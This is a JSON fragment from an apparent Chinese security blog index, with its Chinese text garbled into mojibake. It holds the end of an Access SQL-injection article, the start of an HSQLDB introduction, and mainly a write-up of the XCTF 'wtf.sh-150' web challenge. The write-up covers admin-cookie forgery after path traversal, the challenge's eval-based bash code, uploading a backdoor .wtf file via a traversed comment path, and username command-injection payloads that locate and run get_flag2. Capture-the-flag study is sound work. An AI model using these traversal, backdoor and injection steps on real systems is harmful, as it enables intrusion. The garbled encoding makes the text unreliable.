ç°åœ¨å­˜åœ¨Accessæ•°æ®åº“çš„ç½‘ç«™è¶Šæ¥è¶Šå°‘äº†ï¼Œä¸€èˆ¬éƒ½æ˜¯ä¸€äº›å°å‹ç«™æˆ–æ˜¯è€ç«™ï¼Œç›¸å¯¹æ¥è¯´å‚è€ƒä»·å€¼è¾ƒä½ã€‚è€Œéšç€æ–°å‹æ•°æ®åº“çš„å…´èµ·ï¼Œæ…¢æ…¢åœ°Accessæ•°æ®åº“ä¹Ÿä¼šå·å…¥æ—¶ä»£çš„æµªæ½®é‡Œè€Œæ¶ˆå¤±ã€‚ä½†æ€æ ·æœ‰æ•ˆåœ°é˜²èŒƒSQLæ³¨å…¥ã€æå‡ç½‘ç»œå®‰å…¨æ„è¯†å´æ˜¯ä¸ªé•¿ä¹…çš„è®®é¢˜ã€‚ 0x06 å‚è€ƒæ–‡ç«  [accessåç§»æ³¨å…¥åŸç†] SQLæ³¨å…¥ç³»åˆ—ä¹‹ASP+ACCESSæ‰‹åŠ¨æ³¨å…¥(ä¸€)----æ•°å­—å‹ SQLæ³¨å…¥ä¹‹Accessæ•°æ®åº“","categories":["å¸¸è§topæ¼æ´"]},{"title":"wtf.sh-150","path":"/2023/10/05/wtf.sh-150/","content":"é¢˜ç›®æè¿° æ—  é¢˜ç›®è§£é¢˜ è®¿é—®é¦–é¡µåå¦‚ä¸‹å›¾ å‘ç°æ‰¾ä¸å‡ºä»€ä¹ˆä¿¡æ¯ï¼Œäºæ˜¯dirsearchæ‰«äº†ä¹Ÿæ²¡ä»€ä¹ˆå‘ç°ï¼Œåªæœ‰ä¸ªurl/cssï¼Œè®¿é—®ä¹‹åä¼¼ä¹æ²¡æœ‰æ•ˆæœ ä¹‹åçœ‹åˆ°é¦–é¡µæœ‰ç™»å½•ï¼Œæ³¨å†ŒåŠŸèƒ½ï¼Œå°è¯•ä¸€ä¸‹å¼±å£ä»¤å…ˆ æµ‹è¯•äº†å‡ ä¸ªæ²¡æœ‰æˆåŠŸï¼Œä¸è¿‡ç¡®å®šçš„æ˜¯å­˜åœ¨ç®¡ç†å‘˜è´¦æˆ·adminï¼Œé‚£è‚¯å®šæ˜¯è¦æ‰¾åˆ°å…¶å¯†ç ç™»å½•çš„ï¼ˆè¿™é‡Œæˆ‘ä¹Ÿå°è¯•äº†çˆ†ç ´ï¼Œæ— æœï¼‰ã€‚é‚£æˆ‘ä»¬åªèƒ½æ³¨å†Œçœ‹çœ‹äº† æ³¨å†Œä¹‹åéšä¾¿ç‚¹äº†å‡ ä¸ªé“¾æ¥ï¼Œå‘ç°urlå‚æ•°ä¸€ç›´åœ¨å˜ï¼Œé‚£è¿™é‡Œè‚¯å®šæ˜¯æœ‰ä¸œè¥¿çš„ï¼ˆä½†æˆ‘ä¸çŸ¥é“å¦‚ä½•æã€‚ã€‚ï¼‰ä¹‹åæˆ‘å¯¹æ¯”äº†ä¸¤æ¬¡æŠ“åŒ…ç™»å½•æ¡†çš„ä¿¡æ¯ å‘ç°è¿™é‡Œæ˜¯æœ‰cookieå­˜åœ¨çš„ï¼Œé‚£çŒœæµ‹åº”è¯¥æ˜¯æ„é€ adminçš„cookie è¿™é‡Œæ²¡æ€è·¯åçœ‹äº†ä¸¤çœ¼wpè¯´æ˜¯ç›®å½•ç©¿è¶Šã€‚ã€‚ã€‚â”­â”®ï¹â”­â”®å¤ªèœäº†æ ¹æœ¬ä¸å¾€è¿™é‡Œæƒ³ï¼Œé‚£æˆ‘ä»¬å…ˆå°è¯•ä¸€ä¸‹ è¿™é‡ŒçœŸå°´å°¬ï¼Œæˆ‘ç›®å½•ç©¿å¤šäº†ï¼Œé¡µé¢ä¸€ç›´åˆ·æ–°ä¸è¿‡æ¥ï¼Œçœ‹äº†wpå‘ç°å°è¯•ä¸€ä¸ªå°±å¯ä»¥äº†ï¼Œçœ‹æ¥ä»¥åæµ‹è¯•çš„æ—¶å€™æˆ‘ä¹Ÿåº”è¯¥ä»ä¸€ä¸ªå¼€å§‹ï¼Œä¸ç„¶å°±å¿½ç•¥æŸäº›ä¿¡æ¯äº† è¿™é‡Œå‘ä¸‹ç¿»å‘ç°æºç  è¿™é‡Œè™½ç„¶å‘ç°å¯ç–‘å¤„ï¼Œä½†æˆ‘ä¸çŸ¥å¦‚ä½•åˆ©ç”¨ï¼Œåªå¾—åœ¨çœ‹ä¸€çœ¼wp0.o å¤§ä½¬ä»¬è¯´çš„æ˜¯ä»è¿™äº›æºç ä¸­å¯ä»¥åˆ†æå‡ºè¿™ä¸ªadminè´¦æˆ·åº”è¯¥æ˜¯å¯ä»¥ä½¿ç”¨cookieç™»å½•çš„ã€‚ å¹¶ä¸”æºç ä¸­æœ‰ä¸€äº›æ•æ„Ÿä¿¡æ¯ï¼Œæ¯”å¦‚users äºæ˜¯ä»–ä»¬ä¾¿å¼€å§‹è¿™æ ·æ“ä½œï¼šä½¿ç”¨ç›®å½•ç©¿è¶ŠæŸ¥çœ‹usersä¿¡æ¯ å¯ä»¥çœ‹åˆ°å‡ºç°ç–‘ä¼¼md5å­—ç¬¦ä¸²ä»¥åŠbase64ç¼–ç çš„å­—ç¬¦ä¸²ï¼Œè¿™é‡Œæˆ‘æ‰¾äº†ä¸€ä¸‹æˆ‘æ³¨å†Œçš„userä¿¡æ¯ å‘ç°ä¸‹é¢ä¸€è¡Œä¸æˆ‘cookieçš„tokenæ‰€å¯¹åº”ï¼Œé‚£æˆ‘çŒœæµ‹ä¸Šé¢çš„md5æˆ–è®¸æ˜¯å¦‚ä¸‹å›¾æ‰€ç¤ºçš„åŠ å¯†ç»“æœ éšåå°è¯•md5è§£å¯†ï¼Œæ²¡æƒ³åˆ°ç«Ÿç„¶å¯ä»¥è§£å‡ºæ¥ å‘ç°æ˜¯16è¿›åˆ¶å­—ç¬¦ä¸²ï¼Œé‚£æˆ‘ä»¬å†è§£å¯†ä¸€ä¸‹ å¦‚å›¾å‘ç°ä¸æˆ‘åˆ›å»ºçš„è´¦å·å¯†ç æ˜¯ç›¸åŒçš„ï¼Œé‚£æˆ‘ä»¬ç›´æ¥å»è§£å¯†ä¸€ä¸‹adminçš„ä¿¡æ¯çœ‹çœ‹ï¼Œä½†å¯æ¶çš„æ˜¯æˆ‘è§£å¯†ä¸å‡ºæ¥â”­â”®ï¹â”­â”®ï¼Œä¸è¿‡çœ‹äº†wpæˆ‘æ‰å‘ç°æˆ‘æœ‰å¤šè ¢ã€‚è®°å¾—ç™»å½•çš„æ—¶å€™åªéœ€è¦ç”¨æˆ·åå’Œtokenå°±è¡Œäº†ã€‚ã€‚ã€‚ã€‚ã€‚çœŸå°´å°¬å•Š æˆ‘ä»¬ç›´æ¥æ”¹ä¸€æ‰‹usernameå’Œtokenï¼Œä¸è¿‡å¤±è´¥äº†ï¼Œåœ¨çœ‹wpå‘ç°æ˜¯æ–¹æ³•æœ‰é—®é¢˜ã€‚æˆ‘ä»¬å…ˆæ­£ç¡®æ“ä½œä¸€ä¸‹ ç›´æ¥è®¿é—®é¦–é¡µï¼ŒæŠ“åŒ…é¦–é¡µå³å¯ï¼Œä¸è¦åœ¨ç™»å½•æ—¶æŠ“åŒ…ï¼Œå¦‚ä¸‹å›¾æ‰€ç¤ºï¼Œä¹‹åæ·»åŠ adminçš„cookieå³å¯ æ·»åŠ ä¹‹åç›´æ¥æ”¾åŒ…å°±å¯ä»¥çœ‹åˆ°æˆ‘ä»¬æˆåŠŸä»¥adminèº«ä»½ç™»å½• æˆ‘çŒœæµ‹è¿™é‡Œä¸åœ¨ç™»å½•æ—¶æŠ“åŒ…çš„åŸå› æ˜¯ï¼ŒæœåŠ¡å™¨ä¼šæ£€æŸ¥ä½ ç™»å½•æ—¶çš„è´¦å·å¯†ç ï¼Œä»–å¹¶ä¸ä»¥æ£€æŸ¥cookieä¸ºä¸»ï¼Œå¦‚æœä½ è´¦å·å¯†ç ä¸å¯¹ï¼Œå³ä½¿cookieæ˜¯adminçš„ä¹Ÿæ— æ³•æ­£ç¡®ç™»å½•ã€‚è€Œç›´æ¥åœ¨é¦–é¡µæŠ“åŒ…æ·»åŠ cookieå°±é¿å¼€äº†å¯¹è´¦å·å¯†ç çš„æ£€æµ‹ã€‚â€“è¿™ä¹Ÿæä¾›äº†ä¸€äº›å¥‡æ€ªçš„å§¿åŠ¿ ä¹‹åwpè¯´ï¼šä¹‹åç‚¹å‡»ä¸Šå›¾ä¸­çš„Profileï¼Œç»§ç»­æŠ“åŒ…ï¼Œç”¨adminè´¦å·æŸ¥çœ‹ç›¸å…³çš„å†…å®¹ï¼Œå¦‚æœä¸æŠ“åŒ…æ·»åŠ cookieï¼Œå°±æŸ¥çœ‹ä¸åˆ°å‰åŠæ®µflagã€‚ è¿™é‡Œæˆ‘å°±æç„¶äº†ï¼Œæˆ‘ä»¬çœ‹ä¸‹å›¾ è¿™é‡Œè¯´å¦‚æœcookieçš„usernameä»€ä¹ˆä»€ä¹ˆçš„ç­‰äºadminæ‰å¯ä»¥å¾—åˆ°flagã€‚ ä¸è¿‡è¿™é‡ŒæŠ“åŒ…åä»ç„¶éœ€è¦æ·»åŠ cookieæ‰èƒ½è¡Œï¼Œè¿™é‡Œå°±æ˜¯æ€è·¯çš„æ²¿ç”¨ï¼Œå› ä¸ºä¸Šè¿°ä¹Ÿæ˜¯åªå‡­å€Ÿcookieå»ç™»å½•ï¼Œä½†ç™»é™†ä¹‹åä½ ä¼šå‘ç°ç³»ç»Ÿè¿˜æ˜¯æç¤ºä½ ï¼šä½ ä¸æ˜¯adminèº«ä»½ã€‚æ•…æ­¤æˆ‘ä»¬åœ¨è¿›è¡Œæ“ä½œå°±åº”è¯¥æ·»åŠ ä»£è¡¨adminçš„cookieæ‰èƒ½èº²è¿‡æ£€æµ‹å§ã€‚ã€‚ã€‚ è¿™é‡Œæ·»åŠ äº†cookieä¸€ç›´æ”¾åŒ…ï¼Œç„¶åçœ‹åˆ°é¡µé¢å›æ˜¾äº†ä¸€éƒ¨åˆ†flagï¼šFlag: xctf{cb49256d1ab48803 è¿™é‡Œä¹Ÿå°±å¯¹åº”äº†ä¸Šè¿°çš„æºç äº†ã€‚ä¹‹åå°±æ˜¯æˆ‘çœ‹ä¸æ‡‚çš„æ“ä½œäº†ï¼Œåªèƒ½å«æ³ªçœ‹wp-.- è¿™é‡Œä¾¿æ˜¯æœ‰è¶£çš„ä»£ç å®¡è®¡äº†â”­â”®ï¹â”­â”®ã€‚ è¿™é‡Œæ‰¾åˆ°è¿™è¡Œä»£ç çš„æ€è·¯æ˜¯ï¼Œé¢˜ç›®ä¸€ç›´æç¤ºæˆ‘ä»¬WTFè¿™ä¸ªå…³é”®è¯ï¼Œå› æ­¤wpå°±æœç´¢WTFæ‰¾åˆ°äº†å¦‚ä¸‹ä»£ç  â€‹ wtfæ–‡ä»¶å…¶å®æ˜¯ç”¨æˆ·è‡ªå·±å®šä¹‰çš„ä¸€ç§æ–‡ä»¶æ ¼å¼ï¼Œä»–çš„å¤„ç†å…¶å®æ¯ä¸€è¡Œè¿›è¡Œphpä»£ç é€»è¾‘çš„å¤„ç†ï¼Œç”±äºè°ƒç”¨äº†evalæ€è·¯ä¸€ä¸‹å­å°±æ¸…æ™°äº†ï¼Œå¯¹.wtfæ¯ä¸€è¡Œéƒ½è¿›è¡Œäº†evalæ“ä½œï¼Œç»“åˆæ³¨é‡Šæˆ‘ä»¬å¯ä»¥çœ‹åˆ°ï¼Œæ¯ä¸€è¡Œå¿…é¡»ä»¥$å¼€å¤´ max_page_include_depth=64 #ç”¨äºé™åˆ¶åŒ…å«çš„æ·±åº¦ï¼Œæœ€å¤§ä¸º64ã€‚ page_include_depth=0 #è·Ÿè¸ªå½“å‰åŒ…å«çš„æ·±åº¦ï¼Œåˆå§‹åŒ–ä¸º0ã€‚ function include_page { # include_page pathname local pathname=$1 #ç”¨äºå­˜å‚¨ä¼ é€’ç»™å‡½æ•°çš„æ–‡ä»¶è·¯å¾„ã€‚ local cmd= #ç”¨äºæ„å»ºè¦æ‰§è¡Œçš„Shellå‘½ä»¤ã€‚ [[ ${pathname(-4)} = '.wtf' ]];#åˆ¤æ–­æ–‡ä»¶çš„æ‰©å±•åæ˜¯å¦ä¸º \".wtf\"å¦‚æœæ˜¯ï¼Œä¼šå°† can_execute è®¾ç½®ä¸º 1ï¼Œè¡¨ç¤ºå¯ä»¥æ‰§è¡Œå‘½ä»¤ã€‚ local can_execute=$;\t#ç”¨äºæ ‡è®°æ˜¯å¦å¯ä»¥æ‰§è¡Œå‘½ä»¤ã€‚ page_include_depth=$(($page_include_depth+1)) if [[ $page_include_depth -lt $max_page_include_depth ]] #å¦‚æœ page_include_depth å°äº max_page_include_depthï¼Œåˆ™è¿›å…¥æ¡ä»¶åˆ†æ”¯ï¼Œè¡¨ç¤ºå¯ä»¥ç»§ç»­åŒ…å«æ–‡ä»¶ã€‚ then local line; while read -r line; do\t#é€è¡Œè¯»å–è¢«åŒ…å«çš„æ–‡ä»¶ # check if we're in a script line or not ($ at the beginning implies script line) # also, our extension needs to be .wtf #å¯¹äºæ¯ä¸€è¡Œï¼Œé¦–å…ˆæ£€æŸ¥æ˜¯å¦åŒ…å«è„šæœ¬ã€‚å¦‚æœ $ ç¬¦å·å‡ºç°åœ¨è¡Œçš„å¼€å¤´å¹¶ä¸” can_execute ä¸º0ï¼Œåˆ™è¡¨ç¤ºå½“å‰è¡Œæ˜¯è„šæœ¬ã€‚ [[ $ = ${line01} &amp;&amp; ${can_execute} = 0 ]]; is_script=$;\t#ç”¨äºæ ‡è®°å½“å‰è¡Œæ˜¯å¦åŒ…å«è„šæœ¬ã€‚ # execute the line. #å¦‚æœå½“å‰è¡Œä¸æ˜¯è„šæœ¬ï¼ˆ$is_script ä¸º0ï¼‰ï¼Œåˆ™å°†è¯¥è¡Œæ·»åŠ åˆ° cmd å˜é‡ä¸­ï¼Œä»¥ä¾¿æ„å»ºè¦æ‰§è¡Œçš„å‘½ä»¤ã€‚ if [[ $is_script = 0 ]] then cmd+=$'n'${line#$}; else #å¦‚æœå½“å‰è¡Œæ˜¯è„šæœ¬ï¼Œé‚£ä¹ˆæ£€æŸ¥ cmd æ˜¯å¦åŒ…å«å†…å®¹ï¼Œå¦‚æœåŒ…å«ï¼Œåˆ™æ‰§è¡Œ cmd ä¸­çš„å‘½ä»¤ï¼Œå¹¶è®°å½•é”™è¯¯æ—¥å¿—ã€‚ if [[ -n $cmd ]] then eval $cmd log Error during execution of ${cmd}; cmd= fi #å¦‚æœå½“å‰è¡Œä¸æ˜¯è„šæœ¬ï¼Œç›´æ¥è¾“å‡ºè¯¥è¡Œå†…å®¹ã€‚ echo $line fi done ${pathname} else echo pMax include depth exceeded!p fi } ç”±äºä»£ç å®¡è®¡å¤ªèœäº†ï¼Œå°±è·Ÿç€GPTå­¦ä¹ å§ã€‚ã€‚ã€‚ ä¸‹é¢æ˜¯ä¸€äº›ç¬¦å·çš„è§£é‡Š 1. åœ¨è¿™æ®µä»£ç ä¸­ï¼Œ-lt æ˜¯ä¸€ä¸ªæ¯”è¾ƒè¿ç®—ç¬¦ï¼Œç”¨äºæ¯”è¾ƒä¸¤ä¸ªæ•°å€¼ï¼Œå®ƒä»£è¡¨ \"less than\"ï¼ˆå°äºï¼‰çš„æ„æ€ã€‚å…·ä½“æ¥è¯´ï¼Œ-lt ç”¨äºæ¯”è¾ƒå·¦è¾¹çš„æ•°å€¼æ˜¯å¦å°äºå³è¾¹çš„æ•°å€¼ã€‚ 2. -n æ˜¯ä¸€ä¸ªæ¡ä»¶æµ‹è¯•ï¼Œåœ¨è¿™é‡Œçš„ä¸Šä¸‹æ–‡ä¸­ï¼Œå®ƒç”¨äºæ£€æŸ¥ä¸€ä¸ªå˜é‡ $cmd æ˜¯å¦åŒ…å«éç©ºå€¼ã€‚å…·ä½“åœ°è¯´ï¼Œ-n ç”¨äºåˆ¤æ–­ä¸€ä¸ªå­—ç¬¦ä¸²æ˜¯å¦ä¸ºç©ºã€‚ 3. åœ¨è¿™è¡Œä»£ç ä¸­ï¼Œ$1 è¡¨ç¤ºå‡½æ•° include_page çš„ç¬¬ä¸€ä¸ªå‚æ•°ï¼Œä¹Ÿå°±æ˜¯åœ¨è°ƒç”¨è¯¥å‡½æ•°æ—¶ä¼ é€’ç»™å®ƒçš„ç¬¬ä¸€ä¸ªå€¼ã€‚åœ¨Shellè„šæœ¬ä¸­ï¼Œå‡½æ•°å¯ä»¥æ¥å—å¤šä¸ªå‚æ•°ï¼Œè¿™äº›å‚æ•°å¯ä»¥é€šè¿‡$1ã€$2ã€$3 ç­‰æ¥è®¿é—®ï¼Œåˆ†åˆ«ä»£è¡¨ç¬¬ä¸€ä¸ªã€ç¬¬äºŒä¸ªã€ç¬¬ä¸‰ä¸ªå‚æ•°ï¼Œä¾æ­¤ç±»æ¨ã€‚ èƒ½å¤Ÿè§£æå¹¶æ‰§è¡Œwtfæ–‡ä»¶ï¼Œå¦‚æœè¿˜èƒ½å¤Ÿä¸Šä¼ wtfæ–‡ä»¶å¹¶æ‰§è¡Œçš„è¯ï¼Œå°±å¯ä»¥è¾¾åˆ°æ§åˆ¶æœåŠ¡å™¨çš„ç›®çš„ã€‚ function reply { local post_id=$1; local username=$2; local text=$3; local hashed=$(hash_username \"${username}\"); #éå†åä¸º posts/${post_id}/ çš„ç›®å½•ä¸­çš„æ‰€æœ‰æ–‡ä»¶å’Œå­ç›®å½•ã€‚ä½¿ç”¨ basename å‘½ä»¤æå–æ¯ä¸ªæ–‡ä»¶å’Œå­ç›®å½•çš„åç§°ã€‚ #å¯¹è¿™äº›åç§°è¿›è¡Œæ•°å€¼æ’åºï¼ˆsort -nï¼‰ã€‚ä»æ’åºåçš„åˆ—è¡¨ä¸­é€‰æ‹©æœ€åä¸€ä¸ªï¼ˆtail -n 1ï¼‰ï¼Œè¿™å°†æ˜¯å½“å‰æœ€åä¸€ä¸ªå›å¤çš„IDã€‚ curr_id=$(for d in posts/${post_id}/*; do basename $d; done | sort -n | tail -n 1); #è®¡ç®—ä¸‹ä¸€ä¸ªå›å¤çš„IDï¼ˆnext_reply_idï¼‰ï¼Œå®ƒæ˜¯å½“å‰æœ€åä¸€ä¸ªå›å¤çš„IDåŠ 1ã€‚ next_reply_id=$(awk '{print $1+1}' &lt;&lt;&lt; \"${curr_id}\"); #åˆ›å»ºä¸€ä¸ªæ–°çš„å›å¤æ–‡ä»¶çš„è·¯å¾„ï¼ˆnext_fileï¼‰ï¼Œè¯¥è·¯å¾„ç”± posts/${post_id}/${next_reply_id} æ„æˆã€‚ next_file=(posts/${post_id}/${next_reply_id}); #åœ¨æ–°çš„å›å¤æ–‡ä»¶ä¸­å†™å…¥ä»¥ä¸‹å†…å®¹ï¼š #å›å¤çš„ç”¨æˆ·åï¼ˆ${username}ï¼‰,å›å¤çš„ä¸»é¢˜ï¼ˆé€šè¿‡è°ƒç”¨ nth_line 2 ä»ç¬¬ä¸€ä¸ªå›å¤æ–‡ä»¶ä¸­è·å–ï¼‰,å›å¤çš„æ–‡æœ¬å†…å®¹ï¼ˆ${text}ï¼‰ echo \"${username}\" &gt; \"${next_file}\"; echo \"RE: $(nth_line 2 &lt;; \"posts/${post_id}/1\")\" &gt;&gt; \"${next_file}\"; echo \"${text}\" &gt;&gt; \"${next_file}\"; # add post this is in reply to to posts cache #æœ€åï¼Œå°†æ–°å›å¤çš„ä¿¡æ¯æ·»åŠ åˆ°å›å¤ç”¨æˆ·çš„å¸–å­ç¼“å­˜ä¸­ï¼Œè¿™æ˜¯é€šè¿‡å°†ä¿¡æ¯è¿½åŠ åˆ° users_lookup/${hashed}/posts æ–‡ä»¶æ¥å®ç°çš„ã€‚è¿™å°†å…è®¸ç”¨æˆ·è½»æ¾æŸ¥æ‰¾ä»–ä»¬æ‰€å›å¤çš„å¸–å­ã€‚ echo \"${post_id}/${next_reply_id}\" &gt;&gt; \"users_lookup/${hashed}/posts\"; } è¿™æ˜¯è¯„è®ºåŠŸèƒ½çš„åå°ä»£ç ï¼Œè¿™éƒ¨åˆ†ä¹Ÿæ˜¯å­˜åœ¨è·¯å¾„ç©¿è¶Šçš„ã€‚ è¿™è¡Œä»£ç æŠŠç”¨æˆ·åå†™åœ¨äº†è¯„è®ºæ–‡ä»¶çš„å†…å®¹ä¸­ï¼š echo \"${username}\" &gt; \"${next_file}\"; é€šè¿‡ä¸Šé¢çš„åˆ†æï¼šå¦‚æœç”¨æˆ·åæ˜¯ä¸€æ®µå¯æ‰§è¡Œä»£ç ï¼Œè€Œä¸”å†™å…¥çš„æ–‡ä»¶æ˜¯ wtf æ ¼å¼çš„ï¼Œé‚£ä¹ˆè¿™ä¸ªæ–‡ä»¶å°±èƒ½å¤Ÿæ‰§è¡Œæˆ‘ä»¬æƒ³è¦çš„ä»£ç ã€‚ ï¼ˆè€Œä¸”wtf.shåªè¿è¡Œæ–‡ä»¶æ‰©å±•åä¸º.wtfçš„è„šæœ¬å’Œå‰ç¼€ä¸ºâ€™$'çš„è¡Œï¼‰ â€‹ æˆ‘ä»¬å¯ä»¥åˆ©ç”¨çš„æ˜¯textå’Œusernameï¼Œç„¶åç”¨æˆ·åå’Œtextæœ€åä¼šè¢«ä¿å­˜åˆ°posts/${post_id}/${next_reply_id}è·¯å¾„ä¸‹ å¦‚æœæˆ‘ä»¬èƒ½å¤Ÿæ‰‹åŠ¨æ„é€ è·¯å¾„ï¼Œä½¿å¾—æœ€åæ–‡ä»¶è·¯å¾„åç¼€æ˜¯.wtfçš„è¯ï¼Œä»–å°±ä¼šè§£æä¸º.wtfæ–‡ä»¶ï¼Œæ‰§è¡Œevalå‡½æ•°ï¼Œé‚£ä¹ˆç…§ç€è¿™ä¸ªæ€è·¯ï¼Œå¼€å§‹åˆ©ç”¨ å•çœ‹è¿™æ®µä»£ç ï¼Œusernameå’Œtextå¥½åƒéƒ½èƒ½åˆ©ç”¨ï¼Œä½†æ˜¯textä¸æ‰§è¡Œç³»ç»Ÿå‘½ä»¤ï¼Œåªè¾“å‡ºæ–‡æœ¬ï¼Œå¯èƒ½åœ¨å…¶ä»–åœ°æ–¹åšäº†è¿‡æ»¤ï¼Œé‚£ä¹ˆåªèƒ½åˆ©ç”¨username å…ˆçœ‹çœ‹usernameåœ¨å“ªï¼Œæ„é€ ç”¨æˆ·å${find,/,-iname,get_flag2}//ç©ºæ ¼è¢«è¿‡æ»¤äº†ï¼Œ{,}æ˜¯bashç»•è¿‡ç©ºæ ¼è¿‡æ»¤çš„æ–¹æ³•ä¹‹ä¸€ $/usr/bin/get_flag2å¾—åˆ°flag å…ˆæ™®é€šåœ°è¯„è®ºä¸€ä¸‹ï¼ŒçŸ¥æ™“è¯„è®ºå‘é€çš„æ•°æ®åŒ…çš„ç»“æ„ï¼Œåœ¨æ™®é€šè¯„è®ºçš„åŸºç¡€ä¸Šï¼Œè¿›è¡Œè·¯å¾„ç©¿è¶Š ä¿®æ”¹è·¯å¾„å»ä¸Šä¼  ä¸Šä¼ åé—¨sh.wtfï¼Œwtfåé¢è¦åŠ %09,è¡¨ç¤ºåˆ¶è¡¨ç¬¦,å¦åœ¨ä¼šè¢«å½“åšç›®å½•å»è§£æï¼Œä¸è¿‡è¿™é‡Œç›´æ¥â€¦/hm.wtf%09ä¹Ÿå¯ï¼Œè¿™é‡Œæ˜¯wpæ·»åŠ äº†ä¸€ä¸ªurlå¤§æ¦‚æ˜¯ä¸ºäº†æ–¹ä¾¿å§ å¦‚å›¾è¿™é‡Œåº”è¯¥å°±æ˜¯æˆåŠŸä¸Šä¼ äº† ç„¶åæˆ‘ä»¬å»æ³¨å†Œç”¨æˆ·ï¼Œç”¨æˆ·åå°±æ˜¯æˆ‘ä»¬æŸ¥æ‰¾get_flag2çš„å‘½ä»¤ï¼Œä»¥è¿™ä¸ªç”¨æˆ·åå»è¯„è®ºç„¶åä¸Šä¼ åˆ°ä¹‹å‰åé—¨çš„è·¯å¾„ã€‚ ç¬¬ä¸€æ¡é¦–å…ˆæŸ¥æ‰¾get_flag2${find,/,-iname,get_flag2} è¿™é‡Œå‰é¢åŠ ä¸ª$æ˜¯wtfæ–‡ä»¶æ‰§è¡Œå‘½ä»¤çš„å†™æ³• æ³¨å†ŒæˆåŠŸåå»è¯„è®ºåŠŸèƒ½æŠ“åŒ… ä¹‹åè®¿é—®è·¯å¾„çœ‹çœ‹ æˆåŠŸæ‰§è¡Œï¼Œå¾—åˆ°flag2çš„è·¯å¾„ï¼Œä¹‹åç»§ç»­å‡­æ­¤è·¯å¾„å½“åšç”¨æˆ·åå»æ³¨å†Œï¼Œå¹¶ä¸Šä¼ è‡³ht.wtfåé—¨ $/usr/bin/get_flag2 æ‹¿åˆ°flag xctf{cb49256d1ab48803149e5ec49d3c29ca} å‚è€ƒæ–‡ç«  æ”»é˜²ä¸–ç•Œ WEB wtf.sh-150 æ”»é˜²ä¸–ç•ŒXCTFï¼šwtf.sh-150 ã€æ„šå…¬ç³»åˆ—ã€‘2023å¹´06æœˆ æ”»é˜²ä¸–ç•Œ-Webï¼ˆwtf.sh-150ï¼‰ æ”»é˜²ä¸–ç•Œ webè¿›é˜¶åŒº wtf.sh-150","tags":["æ”»é˜²ä¸–ç•Œ"],"categories":["æ”»é˜²ä¸–ç•Œ"]},{"title":"åˆè¯†HSQL","path":"/2023/10/03/chu-shi-hsql/","content":"0x01 å‰è¨€ æœ¬æ–‡ä¸»è¦æ˜¯åœ¨ä¸€æ¬¡åšæ”»é˜²ä¸–ç•Œä¸­çš„é¢˜æ—¶ï¼Œæ‰€é‡åˆ°çš„ä¸æ‡‚çš„ç‚¹ï¼Œæ•…æ­¤å­¦ä¹ ä¸€ç•ªè®°å½•ä¸€ä¸‹ã€‚è¿™é‡Œå¹¶ä¸ä¼šè®²å¤ªæ·±ï¼Œemmmï¼Œå› ä¸ºæˆ‘æ„Ÿè§‰ä¸å¿…å¤ªæ·±åªæ˜¯æ‡‚äº†å„ç§å¢åˆ æ”¹æŸ¥çš„è¯­å¥æˆ‘è®¤ä¸ºå³å¯ã€‚è¯ä¸éƒ½è¯´å¼€å§‹å·ï¼ 0x02 Hsql 2.1 HSQLDB ä»‹ç» HyperSQL æ•°æ®åº“ (HSQLDB) æ˜¯ä¸€ç§ç°ä»£å…³ç³»æ•°æ®åº“ç®¡ç†å™¨ï¼Œå®ƒç´§å¯†ç¬¦åˆ SQL:2011 æ ‡å‡†å’Œ JDBC 4 è§„èŒƒã€‚å®ƒæ”¯æŒæ‰€æœ‰æ ¸å¿ƒåŠŸèƒ½å’Œ RDBMSã€‚HSQLDB ç”¨äºå¼€å‘ã€æµ‹è¯•å’Œéƒ¨ç½²æ•°æ®åº“åº”ç”¨ç¨‹åºã€‚ HSQLDB çš„ä¸»è¦å’Œç‹¬ç‰¹åŠŸèƒ½æ˜¯æ ‡å‡†åˆè§„æ€§ã€‚å®ƒå¯ä»¥åœ¨ç”¨æˆ·çš„åº”ç”¨ç¨‹åºè¿›ç¨‹å†…ã€åº”ç”¨ç¨‹åºæœåŠ¡å™¨å†…æˆ–ä½œä¸ºå•ç‹¬çš„æœåŠ¡å™¨è¿›ç¨‹æä¾›æ•°æ®åº“è®¿é—®ã€‚ 2.2 HSQLDB ç‰¹ç‚¹ HSQLDB ä½¿ç”¨å†…å­˜ç»“æ„å¯¹æ•°æ®åº“æœåŠ¡å™¨è¿›è¡Œå¿«é€Ÿæ“ä½œã€‚å®ƒæ ¹æ®ç”¨æˆ·çš„çµæ´»æ€§ä½¿ç”¨ç£ç›˜æŒä¹…æ€§ï¼Œå¹¶å…·æœ‰å¯é çš„å´©æºƒæ¢å¤ã€‚ HSQLDB ä¹Ÿé€‚ç”¨äºå•†ä¸šæ™ºèƒ½ã€ETL å’Œå…¶ä»–å¤„ç†å¤§å‹æ•°æ®é›†çš„åº”ç”¨ç¨‹åºã€‚ HSQLDB å…·æœ‰å¹¿æ³›çš„ä¼ä¸šéƒ¨ç½²é€‰é¡¹ï¼Œä¾‹å¦‚ XA äº‹åŠ¡ã€è¿æ¥æ± æ•°æ®æºå’Œè¿œç¨‹èº«ä»½éªŒè¯ã€‚ HSQLDB æ˜¯ç”¨ Java ç¼–ç¨‹è¯­è¨€ç¼–å†™çš„ï¼Œå¹¶åœ¨ Java è™šæ‹Ÿæœº (JVM) ä¸­è¿è¡Œã€‚å®ƒæ”¯æŒç”¨äºæ•°æ®åº“è®¿é—®çš„ JDBC æ¥å£ã€‚ 2.3 HSQLDB ç»„æˆéƒ¨åˆ† HSQLDB jar åŒ…ä¸­æœ‰ä¸‰ä¸ªä¸åŒçš„ç»„ä»¶ã€‚ HyperSQL RDBMS å¼•æ“ (HSQLDB) HyperSQL JDBC é©±åŠ¨ç¨‹åº æ•°æ®åº“ç®¡ç†å™¨ï¼ˆGUI æ•°æ®åº“è®¿é—®å·¥å…·ï¼Œå…·æœ‰ Swing å’Œ AWT ç‰ˆæœ¬ï¼‰ HyperSQL RDBMS å’Œ JDBC é©±åŠ¨ç¨‹åºæä¾›æ ¸å¿ƒåŠŸèƒ½ã€‚æ•°æ®åº“ç®¡ç†å™¨æ˜¯é€šç”¨æ•°æ®åº“è®¿é—®å·¥å…·ï¼Œå¯ä¸ä»»ä½•å…·æœ‰ JDBC é©±åŠ¨ç¨‹åºçš„æ•°æ®åº“å¼•æ“ä¸€èµ·ä½¿ç”¨ã€‚ å¦ä¸€ä¸ªåä¸º sqltool.jar çš„ jar åŒ…å« Sql Toolï¼Œå®ƒæ˜¯ä¸€ä¸ªå‘½ä»¤è¡Œæ•°æ®åº“è®¿é—®å·¥å…·ã€‚è¿™æ˜¯ä¸€ä¸ªé€šç”¨å‘½ä»¤ã€‚Line 